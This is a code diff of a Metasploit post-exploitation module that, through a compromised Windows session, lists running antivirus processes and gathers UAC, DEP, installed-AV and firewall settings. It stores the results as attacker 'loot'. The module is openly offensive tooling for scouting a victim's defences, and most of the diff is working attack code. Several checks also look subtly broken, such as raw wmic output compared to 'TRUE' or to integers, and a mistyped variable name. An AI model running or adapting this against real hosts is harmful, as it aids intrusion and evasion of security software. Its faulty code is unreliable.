@@ -13,9 +13,9 @@
 #
 #
 # [ DESCRIPTION ]
-# This post-module enumerates AVs present in taret process task manager (windows platforms).
-# Presents process name(s), pid(s) and process absoluct path(s) to attacker and store results
-# data into ~/.msf4/loot local directory (set STORE_LOOT true).
+# This post-module enumerates AV(s) process names active on remote task manager (windows platforms).
+# Presents process name(s), pid(s) and process absoluct path(s), Checks remote UAC settings, DEP Policy
+# settings, Built-in firewall settings, Shares and store results into ~/.msf4/loot local directory.
 #
 #
 # [ MODULE OPTIONS ]
@@ -49,10 +49,11 @@
 
 
 
-## Metasploit Module librarys to load ..
+## Metasploit Module librarys
 require 'rex'
 require 'msf/core'
 require 'msf/core/post/common'
+require 'msf/core/post/windows/registry'
 
 
 ## Metasploit Class name and mixins ..
@@ -61,15 +62,14 @@ class MetasploitModule < Msf::Post
 
          include Msf::Post::Common
          include Msf::Post::Windows::Error
+         include Msf::Post::Windows::Registry
 
 
-
-        ## The 'def initialize()' funtion ..
         def initialize(info={})
                 super(update_info(info,
                         'Name'          => 'Windows Gather Protection Enumeration',
                         'Description'   => %q{
-                                        This post-module enumerates AVs present in taret process task manager (windows platforms). Presents process name(s), pid(s) and process absoluct path(s) to attacker and store results data into ~/.msf4/loot local directory (set STORE_LOOT true).
+                                        This post-module enumerates AV(s) process names active on remote task manager (windows platforms). Presents process name(s), pid(s) and process absoluct path(s), Checks remote UAC settings, DEP Policy settings, Built-in firewall settings, Shares and store results into ~/.msf4/loot local directory.
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -77,8 +77,8 @@ class MetasploitModule < Msf::Post
                                         'r00t-3xp10it <pedroubuntu10[at]gmail.com>',
                                 ],
  
-                        'Version'        => '$Revision: 1.0',
-                        'DisclosureDate' => '25 03 2019',
+                        'Version'        => '$Revision: 1.2',
+                        'DisclosureDate' => '26 03 2019',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'false',   # Thats no need for privilege escalation.
@@ -112,42 +112,126 @@ class MetasploitModule < Msf::Post
 
 def run
   session = client
-  ## Variable declarations (msf API calls)
+  ## Variable declarations (API calls)
   sysnfo = session.sys.config.sysinfo
   runtor = client.sys.config.getuid
   runsession = client.session_host
   directory = client.fs.dir.pwd
 
-## MODULE BANNER
-if datastore['BANNER'] == true
-  print_line("    +--------------------------------------------+")
-  print_line("    |     Enumerate AVs presence in processes    |")
-  print_line("    |        Author : r00t-3xp10it (SSA)         |")
-  print_line("    +--------------------------------------------+")
-  print_line("")
-  print_line("    Running on session  : #{datastore['SESSION']}")
-  print_line("    Architecture        : #{sysnfo['Architecture']}")
-  print_line("    Computer            : #{sysnfo['Computer']}")
-  print_line("    Target IP addr      : #{runsession}")
-  print_line("    Operative System    : #{sysnfo['OS']}")
-  print_line("    Payload directory   : #{directory}")
-  print_line("    Client UID          : #{runtor}")
-  print_line("")
-  print_line("")
-end
+
+  ## POST MODULE BANNER
+  if datastore['BANNER'] == true
+     print_line("    +--------------------------------------------+")
+     print_line("    |     Enumerate protections of remote PC     |")
+     print_line("    |        Author : r00t-3xp10it (SSA)         |")
+     print_line("    +--------------------------------------------+")
+     print_line("")
+     print_line("    Running on session  : #{datastore['SESSION']}")
+     print_line("    Architecture        : #{sysnfo['Architecture']}")
+     print_line("    Computer            : #{sysnfo['Computer']}")
+     print_line("    Target IP addr      : #{runsession}")
+     print_line("    Operative System    : #{sysnfo['OS']}")
+     print_line("    Payload directory   : #{directory}")
+     print_line("    Client UID          : #{runtor}")
+     print_line("")
+     print_line("")
+  end
 
 
-  ## Post-Module variable declarations
-  av_list = []
-  data_dump=''
-  print_status("Query: #{sysnfo['Computer']} task manager.")
+  print_status("Enumerating #{runsession} remote protections")
   Rex::sleep(1.5)
 
-     ## check for proper operative system version
+     ## check for proper operative system
      unless sysinfo['OS'] =~ /Windows/i
-        print_error("[ ABORT ]: This module only works againts windows systems.")
+        print_error("[ABORT]: This module only works againts windows systems.")
         return nil
      end
+
+
+     data_dump=''
+     av_list = []
+     ## Query UAC remote settings (regedit)
+     print_line("")
+     print_line("")
+     print_line("UAC - DEP Settings")
+     print_line("------------------")
+     data_dump << "\nUAC - DEP Settings\n"
+     data_dump << "------------------\n"
+
+     uac_check = registry_getvaldata("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","EnableLUA")
+     reg_key = registry_getvaldata("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","ConsentPromptBehaviorAdmin")
+
+        ## Query remote registry (UAC)
+        if uac_check == 1
+           print_line("uacStatus                : enable")
+           data_dump << "uacStatus                : enable\n"
+        else
+           print_line("uacStatus                : disable")
+           data_dump << "uacStatus                : disable\n"
+        end
+
+        if reg_key == 0
+           print_line("levelDescription         : Elevation without consent")
+           data_dump << "levelDescription         : Elevation without consent\n"
+        elsif reg_key == 1
+           print_line("levelDescription         : enter username and password when operations require elevated privileges")
+           data_dump << "levelDescription         : enter username and password when operations require elevated privileges\n"
+        elsif reg_key == 2
+           print_line("levelDescription         : displays the UAC prompt that needs to be permitted or denied on a secure desktop")
+           data_dump << "levelDescription         : displays the UAC prompt that needs to be permitted or denied on a secure desktop\n"
+        elsif reg_key == 3
+           print_line("levelDescription         : prompts for credentials.")
+           data_dump << "levelDescription         : prompts for credentials.\n"
+        elsif reg_key == 4
+           print_line("levelDescription         : prompts for consent by displaying the UAC prompt")
+           data_dump << "levelDescription         : prompts for consent by displaying the UAC prompt\n"
+        elsif reg_key == 5
+           print_line("levelDescription         : prompts for consent for non-Windows binaries")
+           data_dump << "levelDescription         : prompts for consent for non-Windows binaries\n"
+        end
+
+
+     depmode = ""
+     depstatus = ""
+     ## Query DEP (Data Execution Prevention) settings
+     depmode = cmd_exec("wmic OS Get DataExecutionPrevention_SupportPolicy")
+     depstatus = cmd_exec("wmic OS Get DataExecutionPrevention_Available")
+
+        if depstatus == "TRUE"
+           print_line("depStatus          : enable")
+           data_dump << "depStatus          : enable\n"
+        else
+           print_line("depStatus                : disable")
+           data_dump << "depStatus                : disable\n"
+        end
+
+        if depmode == 0
+           print_line("levelDescription   : DEP is off for the whole system.")
+           data_dump << "levelDescription   : DEP is off for the whole system.\n"
+        elsif depmode == 1
+           print_line("levelDescription   : Full DEP coverage for the whole system with no exceptions.")
+           data_dump << "levelDescription   : Full DEP coverage for the whole system with no exceptions.\n"
+        elsif depmode == 2
+           print_line("levelDescription   : DEP is limited to Windows system binaries.")
+           data_dump << "levelDescription   : DEP is limited to Windows system binaries.\n"
+        elsif depmode == 3
+           print_line("levelDescription   : DEP is on for all programs and services.")
+           data_dump << "levelDescription   : DEP is on for all programs and services.\n"
+        end
+        data_dump << "\n\n"
+
+
+        ## AV Install detection
+        Rex::sleep(1.0)
+        print_line("")
+        print_line("")
+        print_line("AV Detection")
+        print_line("------------")
+        av_install = cmd_exec("Powershell /C Get-CimInstance -ClassName AntivirusProduct -NameSPace root\\securitycenter2")
+        print_line(av_install)
+        data_dump << "AV Detection\n"
+        data_dump << "------------\n"
+        data_dump << "#{av_install}\n"
 
 
      ## List of AVs exec names
@@ -392,27 +476,48 @@ end
      }
 
 
-     ## Query target process list for AVs exec names
-     data_dump << "List of AVs found in: #{sysnfo['Computer']}\n\n"
-     data_dump << "-------------------------------------------\n"
+     ## Query target task manager for AV process names
+     Rex::sleep(1.0)
+     print_line("Task Manager Process")
+     print_line("--------------------")
+     data_dump << "Task Manager Process\n"
+     data_dump << "--------------------\n"
      session.sys.process.get_processes().each do |x|
         if (av_list.index(x['name']))
-           print_good("Found - PID: #{x['pid']}   NAME: #{x['name']}   PATH: #{x['path']}")
-           data_dump << "PID: #{x['pid']}   NAME: #{x['name']}   PATH: #{x['path']}\n"
+           print_line("processPID               : #{x['pid']}")
+           data_dump << "processPID               : #{x['pid']}\n"
+           print_line("displayName              : #{x['name']}")
+           data_dump << "displayName              : #{x['name']}\n"
+           print_line("processPath              : #{x['path']}")
+           data_dump << "processPath              : #{x['path']}\n\n"
+           print_line("")
         end
      end
+     data_dump << "\n"
+
+
+
+     output = ""
+     Rex::sleep(1.0)
+     ## Get the configurations of the built-in Windows Firewall
+     print_line("")
+     print_line("")
+     output = cmd_exec("netsh firewall show opmode")
+     print_line(output)
+
+     ## Store captured data in 'data_dump'
+     data_dump << "Built-in firewall settings\n"
+     data_dump << "--------------------------\n"
+     data_dump << "#{output}\n\n"
 
  
-     ## Store (data_dump) contents into msf loot folder? (local) ..
-     if datastore['STORE_LOOT'] == true
-       print_warning("Session logfile stored in: ~/.msf4/loot folder")
-       store_loot("enum_protections", "text/plain", session, data_dump, "enum_protections.txt", "enum_protections")
-     end
-
-
-   #
-   # end of the 'def run()' funtion (exploit code) ..
-   #
+   ## Store (data_dump) contents into msf loot folder? (local) ..
+   if datastore['STORE_LOOT'] == true
+     print_warning("Session logfile stored in: ~/.msf4/loot folder")
+     store_loot("enum_protections", "text/plain", session, data_dump, "enum_protections.txt", "enum_protections")
    end
 
+
+   ## End of the 'def run()' funtion..
+   end
 end
